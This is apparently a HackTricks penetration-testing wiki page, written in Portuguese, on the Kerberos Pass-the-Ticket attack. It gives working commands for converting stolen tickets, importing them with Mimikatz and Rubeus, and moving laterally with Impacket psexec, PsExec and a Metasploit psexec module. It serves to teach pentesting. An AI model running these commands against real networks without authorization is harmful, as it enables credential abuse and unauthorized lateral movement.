# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Visão geral

Em um ataque Pass-the-Ticket (PtT), um adversário usa um ticket Kerberos roubado para se autenticar como o principal do ticket sem possuir a senha dessa conta. Um ticket-granting ticket (TGT) pode ser usado para solicitar tickets de serviço, enquanto um ticket de serviço roubado é limitado ao serviço de destino e ao seu período de validade.<sup>[[1]](#references)</sup>

Para técnicas de obtenção de tickets, consulte:

- [Coletando tickets do Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Coletando tickets do Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Convertendo formatos de ticket do Linux e do Windows

Caches Kerberos geralmente aparecem como arquivos MIT `ccache` no Linux e arquivos `.kirbi` no Windows. `ticket_converter` converte entre esses formatos usando um ticket de entrada e um caminho de saída.<sup>[[2]](#references)</sup>

```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```

Kekeo também oferece ferramentas para tickets Kerberos no Windows.<sup>[[3]](#references)</sup>

## Using a Ticket

No Linux, aponte `KRB5CCNAME` para o cache e instrua um cliente Impacket a usar Kerberos sem solicitar uma senha:<sup>[[4]](#references)</sup>

```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

No Windows, Mimikatz ou Rubeus podem importar um ticket `.kirbi` para a sessão de logon atual. Use `klist` para inspecionar o cache resultante.<sup>[[5]](#references)[[6]](#references)</sup>

```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

A importação do ticket não concede privilégios além dos representados pelo ticket e pela política de autorização do serviço de destino. Tickets expirados, revogados, malformados ou com escopo incorreto podem falhar.<sup>[[1]](#references)</sup>

Para obter um contexto mais amplo sobre ataques Kerberos e técnicas relacionadas de obtenção de tickets, consulte o guia de ataques Kerberos da Tarlogic.<sup>[[7]](#references)</sup>

### Reutilizando um ticket externo no Metasploit

O Metasploit não lê automaticamente o `KRB5CCNAME` do Impacket para seus módulos Kerberos. Forneça ao módulo um **arquivo ccache** por meio da opção específica do protocolo `::Krb5Ccname`. Defina `::Rhostname` como o hostname SPN do destino e o domínio como o domínio do destino; `RHOST` ainda pode ser o IP do destino. Isso permite usar um ticket já obtido sem inserir a senha da conta.<sup>[[8]](#references)</sup>

Converta primeiro um `.kirbi` para ccache, se necessário.<sup>[[9]](#references)</sup>

Por exemplo, com um ticket de uma conta autorizada a criar serviços no destino, execute o [módulo SMB PsExec](../lateral-movement/psexec-and-winexec.md) usando esse cache:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>

```text
use exploit/windows/smb/psexec
set RHOST 192.0.2.20
set SMBUser Administrator
set SMBDomain corp.example
set SMB::Auth kerberos
set SMB::Rhostname server.corp.example
set SMB::Krb5Ccname /path/to/administrator.ccache
set DomainControllerRhost 192.0.2.10
run
```

O Metasploit seleciona primeiro um ticket de serviço correspondente no cache fornecido. Se encontrar apenas um TGT, solicita um ticket de serviço ao KDC; portanto, esse caminho também exige conectividade com o DC. Um cache que contém apenas tickets de serviço não permite acessar hosts não relacionados. Para outros módulos compatíveis, altere o prefixo da opção (por exemplo, `Winrm::Krb5Ccname` para [WinRM](../lateral-movement/winrm.md)).<sup>[[8]](#references)</sup>



## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Exemplos do Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Técnicas de ataque ao Kerberos](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [8] [Metasploit - Autenticação de serviço](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/service_authentication.html)
- [9] [Metasploit - Conversão de arquivos kirbi e ccache](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/ticket_converter.html)
- [10] [Implementação de Kerberos no cliente SMB do Metasploit](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/smb/client.rb)
{{#include ../../banners/hacktricks-training.md}}
